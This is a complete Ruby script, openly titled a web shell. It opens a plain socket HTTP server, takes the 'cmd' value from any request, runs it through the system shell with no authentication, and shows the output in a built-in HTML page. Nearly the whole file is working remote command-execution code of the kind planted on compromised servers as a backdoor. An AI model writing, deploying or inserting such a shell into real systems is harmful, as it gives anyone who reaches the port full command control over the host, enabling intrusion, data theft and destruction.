#!/usr/bin/env ruby
# frozen_string_literal: true

# Small Ruby Web Shell
# This a Ruby web shell written with sockets only

require 'socket'
require 'cgi'

ipaddr, port = ARGV.size == 2 ? ARGV[0..] : ['localhost', 4000]
http = TCPServer.new(ipaddr, port)
response = DATA.read

puts("Pure HTTP server started at #{ipaddr}:#{port}")

while con = http.accept
  data = con.gets
  output = ''

  if data =~ %r{/\?cmd=(.*)\sHTTP}
    output = %x(#{CGI.unescape($1)}) rescue "Command error: #{$1}"
  end

  con.print('HTTP/1.1 200 OK\r\n')
  con.print('Content-Type: text/html\r\n\r\n')
  con.puts(response % output)

  con.close
end

__END__
<html>
<head>
  <meta charset="utf-8">
</head>
<body style="font-family: monospace; text-align: center">
  <form action="/" method="get">
    <h1>Small Ruby Web Shell</h1>
    <input type="text" placeholder="ls -la" name="cmd">
    <input type="submit" value="Run">
  </form>
  <textarea readonly style="background-color: black; color: lime">%s</textarea>
<body>
</html>
